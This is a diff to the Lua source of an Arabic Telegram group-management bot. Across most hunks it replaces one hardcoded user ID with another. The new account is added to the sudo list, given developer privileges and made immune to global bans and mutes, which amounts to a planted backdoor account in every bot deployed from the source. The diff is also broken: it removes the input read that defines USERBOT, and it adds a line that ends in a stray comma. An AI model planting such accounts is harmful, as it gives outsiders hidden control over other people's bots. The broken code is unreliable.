@@ -65,13 +65,7 @@ os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":USERBOT") then
 io.write('\27[31;47m\n◼¦ ارسل لي معرف البوت بدون @ \27[0;34;49m\n')
-local USERBOT = io.read()
-if USERBOT ~= '' then
 database:set(id_server..":USERBOT",USERBOT)
-else
-io.write('\27[31;47m\n◼¦ لم يتم حفظ معرف البوت ارسله مره اخره \27[0;34;49m\n')
-end 
-os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":IDSUDO") then
 io.write('\27[31;47m\n◼¦ ارسل لي ايدي المطور الاساسي \27[0;34;49m\n')
@@ -202,11 +196,13 @@ end
 end
 print(t)
 ----- بدء الاضافات --------
+local USERNAMEBOT = database:get(id_server.."USERBOT"),
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 os.execute("mkdir File_Bot") 
 local runapp = sudos.token
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local bot_username = (USERNAMEBOT or 'TARA1BOT')
+sendText(SUDO,"شكرا لاستخدامك سورس باور\n اضغط /sudo لاظهار كيبورد المطور الاساسي",0,'md')
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
@@ -220,7 +216,7 @@ end
 end  
 return DRAGON  
 end 
-sudo_users = {SUDO,bot_id,1360140225,944353237,9292929292,0303030030,1770288756}   
+sudo_users = {SUDO,bot_id,1360140225,944353237,1236115319,0303030030,1770288756}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users,dev_users) do  
@@ -345,7 +341,7 @@ if tonumber(user_id) == tonumber(944353237) then
 var = true  
 elseif tonumber(user_id) == tonumber(1360140225) then
 var = true  
-elseif tonumber(user_id) == tonumber(9292929292) then
+elseif tonumber(user_id) == tonumber(1236115319) then
 var = true  
 elseif tonumber(user_id) == tonumber(0303030030) then
 var = true  
@@ -391,8 +387,8 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = 'مـبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مـبـرمـج الـسـورس'
-elseif tonumber(user_id) == tonumber(9292929292) then
-var = 'مـلـك الـتـلـجـرام'
+elseif tonumber(user_id) == tonumber(1236115319) then
+var = 'المبرمج ليجاند'
 elseif tonumber(user_id) == tonumber(0303030030) then
 var = 'الباشمبرمج'
 elseif tonumber(user_id) == tonumber(1770288756) then
@@ -4649,8 +4645,8 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر ملك التلجرام عام")
+if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
@@ -4704,8 +4700,8 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مـبـرمـج افـايـره \n")
 return false 
 end
-if result.id_ == tonumber(9292929292) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر ملك التلجرام \n")
+if result.id_ == tonumber(1236115319) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المبرمج ليجاند \n")
 return false 
 end
 if result.id_ == tonumber(1770288756) then
@@ -4753,8 +4749,8 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(userid) == tonumber(9292929292) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر ملك التلجرام عام")
+if tonumber(userid) == tonumber(1236115319) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
 return false 
 end
 if tonumber(userid) == tonumber(1770288756) then  
@@ -4806,8 +4802,8 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم ملك التلجرام عام")
+if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
@@ -4859,8 +4855,8 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مـبـرمـج افـايـره \n")
 return false 
 end
-if result.id_ == tonumber(9292929292) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم ملك التلجرام \n")
+if result.id_ == tonumber(1236115319) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المبرمج ليجاند \n")
 return false 
 end
 if result.id_ == tonumber(1770288756) then
@@ -4903,8 +4899,8 @@ if tonumber(userid) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(9292929292) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم ملك التلجرام عام")
+if tonumber(userid) == tonumber(1236115319) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
 return false 
 end
 if tonumber(userid) == tonumber(1360140225) then  
